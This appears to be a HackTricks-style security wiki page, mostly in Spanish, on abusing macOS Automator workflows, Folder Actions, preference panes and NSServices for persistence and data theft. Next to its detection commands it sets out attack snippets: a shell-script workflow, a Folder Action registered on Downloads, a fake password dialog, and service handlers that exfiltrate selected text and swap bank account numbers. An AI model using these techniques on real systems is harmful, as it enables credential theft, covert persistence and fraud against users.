# macOS Automator, Preference Panes & NSServices Abuse

{{#include ../../../banners/hacktricks-training.md}}

## Acciones y Workflows de Automator

### Información básica

**Automator** es la herramienta visual de automatización de macOS. Ejecuta **workflows** (`.workflow` bundles) compuestos por **actions** (`.action` bundles). Automator también impulsa la integración de **Folder Actions**, **Quick Actions** y **Shortcuts**. En macOS moderno, los workflows también pueden **importarse en Shortcuts**, por lo que la misma lógica maliciosa puede aparecer como un Finder Quick Action, un user service bajo `~/Library/Services/`, o un shortcut respaldado por acciones heredadas de Automator.

Las acciones de Automator son **plugins** cargados en el runtime de Automator cuando se ejecuta un workflow. Pueden:
- Ejecutar scripts de shell arbitrarios
- Procesar archivos y datos
- Interactuar con aplicaciones mediante AppleScript
- Encadenarse para automatización compleja

### Por qué importa

> [!WARNING]
> Los workflows de Automator pueden ser **social-engineered** para su ejecución — parecen simples archivos de documento. Un bundle `.workflow` puede contener comandos shell incrustados que se ejecutan cuando el workflow corre. Combinados con Folder Actions, proporcionan **persistencia automática** que se activa ante eventos de archivos. Los recientes arreglos de Gatekeeper también mostraron que los **Quick Actions integrados en apps** (`Contents/PlugIns/*.workflow`) deben tratarse como contenido ejecutable, no como datos inocuos.

### Descubrimiento
```bash
# Find Automator actions installed on the system
find / -name "*.action" -path "*/Automator/*" -type d 2>/dev/null

# Find user-created workflows / Quick Actions
find ~/Library/Services -name "*.workflow" 2>/dev/null
find ~/Library/Workflows -name "*.workflow" 2>/dev/null
find /Applications -path "*/Contents/PlugIns/*.workflow" -type d 2>/dev/null

# Inspect the embedded workflow definition
plutil -p ~/Library/Services/*.workflow/Contents/document.wflow 2>/dev/null

# List active Folder Actions
defaults read ~/Library/Preferences/com.apple.FolderActionsDispatcher.plist 2>/dev/null

# Using the scanner
sqlite3 /tmp/executables.db "
SELECT e.path, h.handler_metadata
FROM executables e
JOIN executable_handlers eh ON e.id = eh.executable_id
JOIN handlers h ON eh.handler_id = h.id
WHERE h.handler_type = 'automator_action';"
```
### Ataque: Workflow con ingeniería social

Un bundle `.workflow` parece un archivo de documento normal para la mayoría de los usuarios:
```bash
# Create a workflow programmatically
mkdir -p /tmp/Evil.workflow/Contents
cat > /tmp/Evil.workflow/Contents/document.wflow << 'PLIST'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>AMApplicationBuild</key>
<string>523</string>
<key>AMApplicationVersion</key>
<string>2.10</string>
<key>actions</key>
<array>
<dict>
<key>action</key>
<dict>
<key>AMActionVersion</key>
<string>2.0.3</string>
<key>AMApplication</key>
<array>
<string>Automator</string>
</array>
<key>AMBundleID</key>
<string>com.apple.RunShellScript</string>
</dict>
</dict>
</array>
</dict>
</plist>
PLIST
```
### Ataque: Persistencia de Folder Action

Folder Actions ejecutan automáticamente un workflow cuando se agregan archivos a una carpeta monitorizada:
```bash
# Register a Folder Action on ~/Downloads
# Every file the user downloads triggers the workflow

# Method 1: Via AppleScript
osascript -e '
tell application "System Events"
make new folder action at end of folder actions with properties {name:"Downloads", path:(path to downloads folder)}
tell folder action "Downloads"
make new script at end of scripts with properties {name:"Evil", path:"/path/to/evil.workflow"}
end tell
set folder actions enabled to true
end tell'

# Method 2: Via the Folder Actions Setup utility
# Users can be tricked into installing a Folder Action through a .workflow double-click
```
> [!CAUTION]
> Folder Actions persisten a través de reinicios y se ejecutan en silencio. Un Folder Action en `~/Downloads` significa que **cada archivo descargado activa tu payload** — incluidos archivos de Safari, Chrome, AirDrop y adjuntos de email. Ten en cuenta también que `System Events` puede registrar Folder Actions que apunten a scripts fuera de las ubicaciones predeterminadas `~/Library/Scripts/Folder Action Scripts`, lo que hace que valga la pena buscar rutas sueltas. Para implicaciones relacionadas con TCC, consulta [the TCC page](../macos-security-protections/macos-tcc/README.md).

---

## Preference Panes

### Basic Information

Los preference panes (`.prefPane` bundles) son plugins cargados desde **System Settings** (antes System Preferences). Proporcionan paneles de interfaz de configuración para funciones del sistema o de terceros. En sistemas antiguos se cargaban directamente por **System Preferences**; en versiones más recientes, los panes de terceros suelen ser gestionados por un **legacy loader XPC service** iniciado desde System Settings.

### Why This Matters

- Preference panes se ejecutan en un **trusted host process** lanzado por System Settings / System Preferences
- En sistemas modernos ese host puede ser un **`legacyLoader` XPC service**, así que la frontera importante sigue siendo **trusted Apple UI process -> third-party code loading**
- Los preference panes de terceros heredan el **host process security context** y la confianza del usuario asociada a esa interfaz
- Los usuarios instalan preference panes haciendo **double-clicking** en ellos — fácil de ingeniería social
- Una vez instalados, **persisten** y se cargan cada vez que System Settings abre ese panel

### Discovery
```bash
# Find installed preference panes
ls /Library/PreferencePanes/ 2>/dev/null
ls ~/Library/PreferencePanes/ 2>/dev/null
ls /System/Library/PreferencePanes/

# Check for non-Apple preference panes (third-party)
find /Library/PreferencePanes ~/Library/PreferencePanes -name "*.prefPane" 2>/dev/null

# Look for the modern host process used to load legacy panes
ps aux | egrep 'System Settings|System Preferences|legacyLoader'
log show --last 1h --predicate 'process == "legacyLoader" OR process == "System Settings" OR process == "System Preferences"' 2>/dev/null

# Using the scanner
sqlite3 /tmp/executables.db "
SELECT e.path, h.handler_metadata
FROM executables e
JOIN executable_handlers eh ON e.id = eh.executable_id
JOIN handlers h ON eh.handler_id = h.id
WHERE h.handler_type = 'preference_pane';"
```
### Ataque: Secuestro del contexto de privilegios

Un panel de preferencias malicioso hereda el contexto de seguridad del **host del panel** (históricamente `System Preferences`, en versiones más nuevas a menudo un helper `legacyLoader` lanzado por `System Settings`):
```objc
// Preference pane principal class
@interface MaliciousPrefPane : NSPreferencePane
@end

@implementation MaliciousPrefPane
- (void)mainViewDidLoad {
[super mainViewDidLoad];
// This code runs inside the preference-pane host process
// It inherits that host's permissions / trust relationship

// Example: read files accessible to System Settings
NSData *data = [NSData dataWithContentsOfFile:@"/path/to/protected/file"];

// Example: use Accessibility API if System Settings has it
AXUIElementRef systemWide = AXUIElementCreateSystemWide();
// ... control other applications
}
@end
```
### Ataque: Persistencia mediante instalación
```bash
# Install a preference pane (user-level, no admin required)
cp -r /tmp/Evil.prefPane ~/Library/PreferencePanes/

# System-level (requires admin)
sudo cp -r /tmp/Evil.prefPane /Library/PreferencePanes/

# The pane loads every time the user opens System Settings and navigates to it
# For better persistence, set it as the default pane
```
### Ataque: UI Phishing

Un panel de preferencias puede imitar paneles legítimos de la UI del sistema para **phish de credenciales**:
```objc
// Display a fake authentication dialog
NSAlert *alert = [[NSAlert alloc] init];
alert.messageText = @"System Settings needs your password to make changes.";
alert.informativeText = @"Enter your password to allow this.";
[alert addButtonWithTitle:@"OK"];
[alert addButtonWithTitle:@"Cancel"];

NSSecureTextField *passwordField = [[NSSecureTextField alloc] initWithFrame:NSMakeRect(0, 0, 200, 24)];
alert.accessoryView = passwordField;
[alert runModal];

NSString *password = passwordField.stringValue;
// Exfiltrate password...
```
---

## NSServices

### Información básica

**NSServices** permiten que las aplicaciones proporcionen funcionalidad a otras apps a través del **Services menu** (click derecho → Services). Cuando un usuario selecciona texto o datos e invoca un service, los datos seleccionados se **envían al proveedor del service** para su procesamiento.

Los services se declaran en el `Info.plist` de una aplicación bajo la clave `NSServices` y se registran con el pasteboard server (`pbs`). macOS también mantiene una **service cache** y una **restriction policy** que deciden qué services son visibles y si los callers sandboxed deberían recibir una advertencia extra.

### Por qué esto importa

- Los services reciben **cross-application data flow** — el texto seleccionado desde cualquier aplicación se envía al service
- Un service malicioso captura datos de password managers, email clients y aplicaciones financieras
- Los services pueden **devolver datos modificados** a la aplicación que llama (man-in-the-middle sobre operaciones de selección)
- Los nombres de los services pueden diseñarse para parecer legítimos ("Format Text", "Encrypt Selection", "Share")
- El flag opcional `NSRestricted` es relevante para la seguridad: un service marcado como unrestricted puede ser invocable por una app sandboxed sin la advertencia que macOS muestra para services propensos a escape

### Descubrimiento
```bash
# List all registered services
/System/Library/CoreServices/pbs -dump_pboard 2>/dev/null

# Find apps providing services
find /Applications -name "Info.plist" -exec grep -l "NSServices" {} \; 2>/dev/null

# Check specific app's services
defaults read /Applications/SomeApp.app/Contents/Info.plist NSServices 2>/dev/null

# Inspect the service cache and the built-in restriction policy
plutil -p ~/Library/Caches/com.apple.nsservicescache.plist 2>/dev/null
plutil -p ~/Library/Preferences/pbs.plist 2>/dev/null
plutil -p /System/Library/CoreServices/com.apple.NSServicesRestrictions.plist 2>/dev/null

# Hunt for services explicitly marked as restricted / unrestricted
find /Applications -name Info.plist -exec grep -Hn "NSRestricted" {} \; 2>/dev/null

# Using the scanner
sqlite3 /tmp/executables.db "
SELECT e.path, h.handler_metadata
FROM executables e
JOIN executable_handlers eh ON e.id = eh.executable_id
JOIN handlers h ON eh.handler_id = h.id
WHERE h.handler_type = 'service';"
```
### Ataque: Data Interception Service
```xml
<!-- Info.plist NSServices declaration -->
<key>NSServices</key>
<array>
<dict>
<key>NSMessage</key>
<string>processSelection</string>
<key>NSPortName</key>
<string>EvilService</string>
<key>NSSendTypes</key>
<array>
<string>NSStringPboardType</string>
</array>
<key>NSMenuItem</key>
<dict>
<key>default</key>
<string>Format Selected Text</string>
</dict>
</dict>
</array>
```

```objc
// Service handler — receives user-selected text from any application
- (void)processSelection:(NSPasteboard *)pboard
userData:(NSString *)userData
error:(NSString **)error {
NSString *selectedText = [pboard stringForType:NSPasteboardTypeString];

// selectedText contains whatever the user selected in any app
// Could be a password, credit card number, private message, etc.

// Exfiltrate the captured data
[self sendToC2:selectedText];

// Optionally return the text unchanged so user doesn't notice
[pboard clearContents];
[pboard setString:selectedText forType:NSPasteboardTypeString];
}
```
### Ataque: Modificación de datos (Man-in-the-Middle)

Un servicio puede **modificar los datos devueltos** mientras parece proporcionar una función legítima:
```objc
// A "Secure Encrypt" service that actually intercepts and modifies data
- (void)secureEncrypt:(NSPasteboard *)pboard
userData:(NSString *)userData
error:(NSString **)error {
NSString *original = [pboard stringForType:NSPasteboardTypeString];

// Log the original data (credential capture)
[self exfiltrate:original];

// Return modified data (e.g., replace bank account in a wire transfer)
NSString *modified = [original stringByReplacingOccurrencesOfString:@"original-account"
withString:@"attacker-account"];
[pboard clearContents];
[pboard setString:modified forType:NSPasteboardTypeString];
}
```
### Servicios restringidos y abuso moderno

Apple admite un booleano opcional `NSRestricted` por definición de servicio. Si está establecido, macOS advierte a los llamantes en sandbox porque el servicio puede ayudarles a **escapar del sandbox o de límites de privacidad**. Desde una perspectiva ofensiva, esto ofrece dos rutas de auditoría útiles:

- Buscar **servicios de terceros no marcados como restringidos** aunque proxyen Apple Events, acceso a archivos u otras acciones privilegiadas
- Buscar **servicios integrados de alto valor** con strong entitlements (por ejemplo, servicios expuestos por Script Editor o helpers respaldados por Finder) y comprobar si la interacción del usuario basta para convertirlos en un primitive de acceso a datos

Un buen ejemplo reciente es **CVE-2022-48574**, donde el mecanismo de Services podía abusarse para الوصول a **archivos de usuario protegidos por TCC sin el flujo de confirmación esperado**. El bug está corregido, pero la técnica sigue siendo útil para threat modeling: cualquier servicio que reenvíe acceso a archivos o solicitudes de automation en nombre del llamante merece el mismo escrutinio.

---

## Notas de seguridad recientes

- **Quick Actions son contenido ejecutable**: Apple corrigió en 2024 un Gatekeeper bypass donde una Automator Quick Action incluida en una app podía ejecutarse sin la evaluación normal. Al auditar apps, inspecciona `Contents/PlugIns/*.workflow/Contents/document.wflow` exactamente igual que inspeccionarías helper scripts o login items. Consulta [la página de Gatekeeper](../macos-security-protections/macos-gatekeeper.md).
- **Shortcuts pueden heredar el comportamiento heredado de Automator**: Apple también añadió un aviso adicional de consentimiento del usuario después de que se descubriera que shortcuts de terceros usaban una **legacy Automator action** para enviar Apple Events sin el flujo de permisos esperado. Los workflows importados y los paquetes de shortcuts deben revisarse en busca de `Run AppleScript`, `Run Shell Script` y acciones puente similares. Consulta [la página de TCC](../macos-security-protections/macos-tcc/README.md).
- **Automator sigue siendo un límite de privacidad activo**: Apple lanzó otra corrección de Automator en 2025 para el acceso a datos protegidos del usuario. Incluso si Automator es una superficie heredada, trata cualquier workflow runner, Quick Action host o automation bridge como una superficie de ataque actual y no como código muerto.

---

## Cadenas de ataque entre técnicas

### Automator Folder Action → Credential Harvesting
```
1. Install Folder Action on ~/Downloads
2. Workflow scans every downloaded file for credentials/keys
3. grep -r "BEGIN RSA PRIVATE KEY\|password\|token" on each file
4. Exfiltrate findings
```
### Panel de preferencias → Escalada de TCC
```
1. Distribute malicious prefPane (social engineering)
2. User double-clicks → installed in ~/Library/PreferencePanes/
3. PrefPane is loaded by the System Settings / legacyLoader host
4. Inherits the host process trust and any useful entitlements / TCC posture
5. Access protected data, control other apps, or phish from a trusted Apple UI
```
### NSService → Robo de Password Manager
```
1. Register a service named "Secure Copy"
2. User selects password in password manager
3. User right-clicks → Services → "Secure Copy"
4. Service receives the password text
5. Exfiltrate while placing it on clipboard normally
```
## Referencias

* [Apple — About the security content of macOS Ventura 13.7, Sonoma 14.7, and Sequoia 15](https://support.apple.com/en-us/121238)
* [Moonlock — How the NSServices exploit worked on macOS](https://moonlock.com/nsservices-macos)

{{#include ../../../banners/hacktricks-training.md}}
